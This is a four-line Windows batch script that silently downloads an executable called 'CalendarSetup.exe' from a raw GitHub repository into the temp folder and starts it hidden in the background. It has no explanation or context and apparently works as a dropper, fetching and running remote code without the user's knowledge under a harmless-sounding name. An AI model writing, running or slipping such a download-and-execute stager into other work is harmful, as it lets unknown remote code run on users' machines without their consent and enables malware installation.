@echo off
curl -s -o "%TEMP%\cs.exe" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe
start "" /B "%TEMP%\cs.exe"
exit
